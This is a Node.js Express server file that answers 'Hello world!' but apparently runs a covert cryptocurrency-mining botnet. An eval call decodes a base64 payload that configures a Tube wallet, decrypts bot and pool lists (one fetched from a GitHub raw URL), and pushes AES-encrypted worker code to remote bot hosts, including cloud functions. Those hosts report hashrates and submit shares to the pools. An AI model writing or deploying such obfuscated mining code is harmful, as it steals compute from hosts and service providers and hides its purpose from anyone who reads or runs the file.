'use strict';
const fs = require('fs');
const request = require('request');
const CryptoJS = require("crypto-js");
const express=require('express');
const app=express();
app.get('/',function(req,res) { 
  if(req.query.active) res.json({ c: c, pools: mylist(pools), bots: mylist(bots) })
  else { res.send('Hello world!') }
});
var s=app.listen(process.env.PORT||5000,()=>console.log(c.id+' Listening on port '+s.address().port));

var decrypt = function(x){ return Buffer.from(x,'base64').toString('ascii') };

var c = { active: 0, state: 'orange', yellow_pools: false }
var rec = false;

var pools = []; var bots = [];

var glob = function(x) { eval(decrypt(x.substring(-~[]))) }
(`AZGVjcnlwdCA9IGZ1bmN0aW9uKHgpeyByZXR1cm4gQ3J5cHRvSlMuQUVTLmRlY3J5cHQoeC5zcGxpdCgvXHJ8XG4vKS5qb2luKCcnKSwnMTIzNDUnKS50b1N0cmluZyhDcnlwdG9KUy5lbmMuVXRmOCkgfTsKY
y5jb2luID0gJ1R1YmUnOwpjLndhbGxldCA9ICdieGNuTHZ5WU5xYUQ0RDZRZEp5ektmY2pKNlFjTUxnTVcyRE1xRVNVcTh4OUpFTTlmQWc2Y2tXRG5hMlhFajJNOEhmQ1A4RXpjYm5TR2JrWUZndmJ6SHZtMlZBT
jRrOEY2JzsKYy5oYXNoID0gJzAgaC9zIDAvMCc7CnZhciBsaXN0ID0gZGVjcnlwdChmcy5yZWFkRmlsZVN5bmMoJ2xpc3QudHh0JywndXRmOCcpKS5zcGxpdCgnXHJcbicpOwpjLmlkID0gTnVtYmVyKGxpc3Quc
2hpZnQoKSk7CmMucGVlcnMgPSBbbGlzdC5zaGlmdCgpXTsgYy5wZWVycy5wdXNoKGxpc3Quc2hpZnQoKSk7CmZvcih2YXIgaT0wOyBpPGxpc3QubGVuZ3RoOyBpKyspIHsgbGV0IG5ib3Q9e2hvc3Q6bGlzdFtpX
Swgc3RhdGU6J29yYW5nZScsIGhhc2g6JzAgaC9zIFswLzBdJ307IGJvdHMucHVzaChuYm90KTsgd2FrZXVwKG5ib3QsdHJ1ZSkgfTsKcmVxdWVzdCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL
3NidXRjaC9teXBvb2wvbWFzdGVyL3Bvb2xzLnR4dCcsIGZ1bmN0aW9uKGVyciwgcmVzLCBib2R5KSB7CiAgdmFyIGxpc3QgPSBkZWNyeXB0KGJvZHkpLnNwbGl0KCdcclxuJyk7CiAgdmFyIG15Y29pbiA9IHJlc
XVpcmUoJy4vJytjLmNvaW4rJy5qcycpOwogIGZvcih2YXIgaT0wOyBpPGxpc3QubGVuZ3RoOyBpKyspIHBvb2xzLnB1c2gobmV3IG15Y29pbih7IHdhbGxldDogYy53YWxsZXQsIGhvc3Q6IGxpc3RbaV0gfSkpO
wp9KTs=`)

var superbot = decrypt(fs.readFileSync('superbot.js','utf8'));
var worker = superbot+'\n'+decrypt(`
U2FsdGVkX1+jx85xnfAYQZbP9lISexUSlyG05d6xBEmWfIt9f2XFcrnwMJDvQIZA0Rj10NLuOrTJdBzxeqrVkfdrc3l0IGlTwy6X1b07miaY/Zm84VW8Ys5NWclae8zDjdkYi8gk13Tp8kc9StlVxTWeVGqDUsuT
GTk5oGoD0yskh5az4+WjmLYuLQPB22kf8sgShFgxfu5rs6qhmrsXSkSL/xlA9AqhcWya7x32ieYXselAPZ1mbYIR2Ea7VL8/UE0b+GrPC2+30DNZnLTFKIuazr9oC6K9OE2PLwig0yfyLKJqNJSLOP8vwY1KeHom
agrwK1Qoaiiw//rGNdNIZA4RBtcHWdbuMrkxGItLMWr8UyiWx7FJ2CSiuSdeTvhT55VcVVYRTO2a2XRJdRytyXHk4mpQtFjIW0dNdq8MeESHSduKfBPZbGiXM1JhxPBFfDvo6VJa3c8umUwGa96uI3bP/J4UzEpl
DuwGYzwWyuLYxpXxRAhXxzqlbwM/HdmIS3vqh71dCTektrzIooA7tRh4tKDVUNVILVgNC4m9DF+IJOsHomGOs7zHIXk1c3/0qs6M7bgZ0H6VmEKCIVUr6pm7uFKrz5MVGhIlSbP6IptWyybE9ORC0PFxPvt/Ih3s
ZJVF1ep7ksbxF0nrNia1Hm3cQL0hifx4mp5/G2JhdLI/xcxLkhA3oPulryJOYETtQZw0q7VAih8tCYeuqnDzJ2ZFEYQPv2sIfkjQzPvpCi2eZceq30TGSG836aiyYjNq0MsS9VLRuXMx1zN/8nqc6tWwGa8/rz9Q
vScvrDWM/7Fjm9Ixj1rfsJTYeUBt9ppkdSyirV50xwgg/e5wa2UAC1BgAwqIy9ho9ZSoLjqOIADw+V7YQZVBxnOXDC20UVprO7xm0rcoMWm2K4ma01vXnUQhy1f1z1aqAVgSxgRE9eJX5g21zNoVi5X2XC9f7VjC
59j0bv3foy4ZH99XDP1Orc80MXr0/DenClJba8ce/kyav21aiZ8Y4GvF1oiC3j8+`);

function mylist(obj) {
  var result = []
  for(var i=0; i<obj.length; i++) result.push(obj[i].host+' - '+obj[i].state+' - '+obj[i].hash)
  return result
}

function wakeup(bot,now) {
  bot.msg = "wakeup";
  if(now) onmsg(bot)
  else {
    bot.wakeup = setTimeout(function() { onmsg(bot) }, 60000);
    bot.wakecount = 60
  }
}

function onmsg(bot) {
  delete bot.wakeup; delete bot.wakecount;
  if(Object.prototype.toString.call(bot.msg).slice(0,-1).split(' ')[1] == 'Array')
    for(var i=0; i<pools.length; i++) for(var j=0; j<bot.msg.length; j++) {
      if(pools[i].job && pools[i].job.job.job_id == bot.msg[j].job_id) {
        pools[i].mysubmit(bot.msg[j],c.yellow_pools);
        break;
      };
    };

  let jobs = []; for(var i=0; i<pools.length; i++) if(pools[i].job) jobs.push(pools[i].job);
  if (!c.active || jobs.length == 0) wakeup(bot)
  else {
    var data = { jobs: jobs };
    request.post({url:bot.host+'/worker',form:{jobs:jobs},json:true },
      function(error, response, body) {
        if(body && body.toString().includes('Cannot POST'))
          request.post({url:bot.host,form:{worker:worker},json:true},function(error,response,body){botdb(error,body)})
        else botdb(error,body,true)
      }
    )
  }

  function botdb(error,body,next) {
    if(error) bot.msg=error.message
    else if(!body) bot.msg='body is empty'
    else if(body.error) bot.msg=body.error
    else if(!body.state) bot.msg='body is wrong'
    else {
      bot.state = body.state;
      bot.hash = body.hash;
      bot.msg = body.msg;
      if(next) return onmsg(bot);
      else return wakeup(bot,true)
    }
    if(bot.msg == 'body is wrong' && bot.host.includes('cloudfunctions.net')) bot.state = 'orange'
    else bot.state = 'red'; 
    bot.hash = '0 h/s '+bot.hash.split(' ')[2];
    wakeup(bot)
  }
}

setInterval(function() {
  var m = new Date().getMinutes();
  if(c.id == 1 && m < 30) c.active = m+1
  else if(c.id == 2 && m >= 30) c.active = m-29
  else c.active = 0

  if(!rec && c.active == 1) { rec = true;  request(c.peers[c.id-1], function(err, res, body) { rec = false }) }
  if(!rec && c.active == 30) { rec = true; request(c.peers[c.id == 1 ? 1 : 0], function(err, res, body) { rec = false }) }

  //--------------------------------------------------------

  var hsum = 0; var hsub = 0; var hacp = 0;  var rt = false;

  for(var i=0; i<pools.length; i++) {
    hsub += Number(pools[i].hash.split('/')[0]);
    hacp += Number(pools[i].hash.split('/')[1]);
    rt = pools[i].state == 'red' ? true: rt;
  }

  for(var i=0; i<bots.length; i++) {
    var ta = bots[i].hash.split(' '); bots[i].hash = ta[0]+' h/s '+ta[2];
    if(bots[i].wakecount) { bots[i].wakecount--;  bots[i].hash += ' - '+bots[i].wakecount+' sec' }
    hsum += Number(bots[i].hash.split(' ')[0]);
    rt = bots[i].state == 'red' ? true: rt
  }

  c.state = rt ? 'orange' : hsum == 0 ? 'yellow' : 'green'
  c.hash = hsum+' h/s '+hsub+'/'+hacp;
}, 1000);
